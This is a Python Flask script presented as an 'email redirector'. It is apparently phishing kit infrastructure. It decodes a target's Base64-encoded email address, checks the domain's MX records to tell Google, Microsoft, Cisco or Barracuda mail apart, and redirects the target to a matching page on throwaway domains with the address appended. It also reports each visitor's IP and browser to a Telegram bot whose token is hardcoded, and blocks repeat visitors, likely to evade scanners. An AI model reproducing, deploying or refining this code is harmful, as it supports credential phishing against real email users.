import base64
import dns.resolver
from flask import Flask, request, redirect, abort
import json
import requests
from datetime import datetime

"""
Email Redirector Script
=======================

This script redirects emails based on their MX records:
- GSuite/Gmail emails -> https://gusitredirect.com/?email=
- Microsoft Office/OWA emails -> https://f2vvrbpmbv.irkeenesol.shop/?email=
- Outlook Web Access emails -> https://pd5pmd9eaa.predhonati.shop/?email=
- General emails -> https://jujrmdhmyh.unisocroxy.shop/?email=

The script automatically detects mail server types by analyzing MX records and redirects accordingly.
"""

# Initialize Flask app
app = Flask(__name__)

# Configuration
CONFIG = {
    "redirect_urls": {
        "owa": "https://hfuoepjlagxte.manpowerboostoil.com/redir.html#",
        "microsoft_office": "https://www.curreibrowns.com/theaboveisavalidcorrectwhatdoyouthinkprobablywouldbethecause.html#",
        "gsuite": "https://zvmdcx.thaipaicroo.sa.com/7wqzKKHNwOYa@yq4/$",
        "general": "https://djiohgbxqoppes.manpowerboostoil.com/redir.html#"
    },
    "microsoft_patterns": [
        "outlook", "office365", "godaddy", "microsoft", "exchange", "owa", 
        "ppe-hosted", "mail.protection", "mail.protection.outlook", "microsoftonline",
        "protection.outlook", "mail.office365", "mail.office", "smtp.office365",
        "cisco", "barracuda", "mail.cisco", "smtp.cisco", "mail.barracuda", 
        "smtp.barracuda", "barracuda.com", "cisco.com", "ironport", "esa",
        "mail.ironport", "smtp.ironport", "mail.esa", "smtp.esa", "genatec.com",
        "spf.genatec.com", "mail.genatec.com", "smtp.genatec.com"
    ],
    "google_patterns": ["google", "gmail", "gsuite", "googlemail", "aspmx", "alt1", "alt2", "alt3", "alt4"],
    "blacklist_file": "blacklist.json",
    "log_file": "access_log.json",
    "telegram": {
        "enabled": True,
        "bot_token": "7044192951:AAHPcSo-xcyNhF3uCJuark9oBB1-adyapq0",
        "chat_id": "1563968775"
    },
    "access_threshold": 3
}

# Load or initialize blacklist and logs
try:
    with open(CONFIG["blacklist_file"], "r") as f:
        blacklist = json.load(f)
except FileNotFoundError:
    blacklist = {}

try:
    with open(CONFIG["log_file"], "r") as f:
        logs = json.load(f)
except FileNotFoundError:
    logs = []

# Helper: Send Telegram notification
def send_telegram_notification(ip, user_agent):
    if CONFIG["telegram"]["enabled"]:
        message = f"Access from IP: {ip}\nUser-Agent: {user_agent}"
        url = f"https://api.telegram.org/bot{CONFIG['telegram']['bot_token']}/sendMessage"
        response = requests.post(url, data={"chat_id": CONFIG["telegram"]["chat_id"], "text": message})
        print(f"Telegram response: {response.text}")

# Helper: Decode Base64 if applicable
def decode_email(encoded_email):
    try:
        return base64.b64decode(encoded_email).decode("utf-8")
    except Exception:
        return encoded_email

# Helper: Determine redirect URL
def determine_redirect_url(email_domain):
    try:
        mx_records = dns.resolver.resolve(email_domain, "MX")
        mail_servers = [str(record.exchange) for record in mx_records]
        
        # Check for Google/GSuite mail servers - these are the standard MX records for GSuite
        google_mx_patterns = [
            "google", "gmail", "gsuite", "googlemail", "aspmx", "alt1", "alt2", "alt3", "alt4",
            "aspmx.l.google.com", "alt1.aspmx.l.google.com", "alt2.aspmx.l.google.com",
            "alt3.aspmx.l.google.com", "alt4.aspmx.l.google.com", "aspmx2.googlemail.com",
            "aspmx3.googlemail.com", "aspmx4.googlemail.com", "aspmx5.googlemail.com",
            "mx1.google.com", "mx2.google.com", "mx3.google.com", "mx4.google.com",
            "smtp.gmail.com", "gmail-smtp-in.l.google.com", "gmail-smtp-out.l.google.com"
        ]
        
        # Enhanced Microsoft, Cisco, and Barracuda patterns
        microsoft_cisco_barracuda_patterns = [
            # Microsoft patterns
            "outlook", "office365", "godaddy", "microsoft", "exchange", "owa", 
            "ppe-hosted", "mail.protection", "mail.protection.outlook", "microsoftonline",
            "protection.outlook", "mail.office365", "mail.office", "smtp.office365",
            "mail.protection.outlook.com", "mail.office365.com", "mail.office.com",
            "smtp.office365.com", "protection.outlook.com", "microsoftonline.com",
            
            # Cisco patterns
            "cisco", "mail.cisco", "smtp.cisco", "cisco.com", "ironport", "esa",
            "mail.ironport", "smtp.ironport", "mail.esa", "smtp.esa", "ironport.com",
            "esa.cisco.com", "ironport.cisco.com", "mail.ironport.com", "smtp.ironport.com",
            
            # Barracuda patterns
            "barracuda", "mail.barracuda", "smtp.barracuda", "barracuda.com",
            "mail.barracuda.com", "smtp.barracuda.com", "barracuda.net",
            "mail.barracuda.net", "smtp.barracuda.net",
            
            # Genatec patterns (Microsoft Office)
            "genatec.com", "spf.genatec.com", "mail.genatec.com", "smtp.genatec.com"
        ]
        
        for mail_server in mail_servers:
            mail_server_lower = mail_server.lower()
            
            # Check for Google/GSuite patterns first (highest priority)
            if any(pattern in mail_server_lower for pattern in google_mx_patterns):
                print(f"GSuite/Gmail detected for {email_domain}: {mail_server}")
                return CONFIG["redirect_urls"]["gsuite"]
            
            # Check for Microsoft, Cisco, and Barracuda patterns
            if any(pattern in mail_server_lower for pattern in microsoft_cisco_barracuda_patterns):
                print(f"Microsoft/Cisco/Barracuda detected for {email_domain}: {mail_server}")
                return CONFIG["redirect_urls"]["microsoft_office"]
            
            # Legacy specific checks (keeping for backward compatibility)
            if "ppe-hosted.com" in mail_server:
                print(f"Microsoft Office (ppe-hosted) detected for {email_domain}: {mail_server}")
                return CONFIG["redirect_urls"]["microsoft_office"]
            if "owa" in mail_server:
                print(f"OWA detected for {email_domain}: {mail_server}")
                return CONFIG["redirect_urls"]["owa"]
        
        print(f"No specific mail server pattern detected for {email_domain}, using general redirect")
        return CONFIG["redirect_urls"]["general"]
    except dns.resolver.NXDOMAIN:
        print(f"Domain {email_domain} not found, using general redirect")
        return CONFIG["redirect_urls"]["general"]
    except Exception as e:
        print(f"Error determining redirect URL for {email_domain}: {e}")
        return CONFIG["redirect_urls"]["general"]

# Helper: Log and blacklist IPs
def log_and_check_blacklist(ip, user_agent):
    # Skip localhost or trusted IPs
    trusted_ips = ["127.0.0.1"]
    if ip in trusted_ips:
        print(f"Trusted IP {ip} is not logged or blacklisted.")
        return False

    # Exclude requests to external redirect URLs
    excluded_urls = list(CONFIG["redirect_urls"].values())
    referrer = request.referrer or ""
    if any(url in referrer for url in excluded_urls):
        print(f"Excluding request to {referrer} from logging and blacklist.")
        return False

    # Check blacklist
    if ip in blacklist:
        print(f"IP {ip} is blacklisted.")
        return True

    # Log access
    logs.append({"ip": ip, "user_agent": user_agent, "timestamp": datetime.utcnow().isoformat()})
    access_count = sum(1 for log in logs if log["ip"] == ip)
    print(f"IP {ip} access count: {access_count}")

    # Blacklist if threshold exceeded
    if access_count > CONFIG["access_threshold"]:
        print(f"IP {ip} is being blacklisted.")
        blacklist[ip] = datetime.utcnow().isoformat()
        with open(CONFIG["blacklist_file"], "w") as f:
            json.dump(blacklist, f)
        return True

    # Save logs
    with open(CONFIG["log_file"], "w") as f:
        json.dump(logs, f)
    return False

# Route for redirection
@app.route("/redirect<path:url>", methods=["GET"])
def redirector(url):
    # Get the real client IP from headers
    ip = request.headers.get("X-Real-IP", request.remote_addr)
    user_agent = request.headers.get("User-Agent", "Unknown")

    # Check blacklist
    if log_and_check_blacklist(ip, user_agent):
        abort(403, "Access Denied")

    send_telegram_notification(ip, user_agent)

    # Check for `|` in the URL
    if "|" not in url:
        return "Invalid URL format", 400

    encoded_email = url.split("|", 1)[1]
    email = decode_email(encoded_email)

    # Validate email format
    if "@" not in email or "." not in email.split("@")[1]:
        return "Invalid email address", 400

    email_domain = email.split("@")[1]
    redirect_url = determine_redirect_url(email_domain)

    return redirect(f"{redirect_url}{email}", code=302)

# Run the app
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
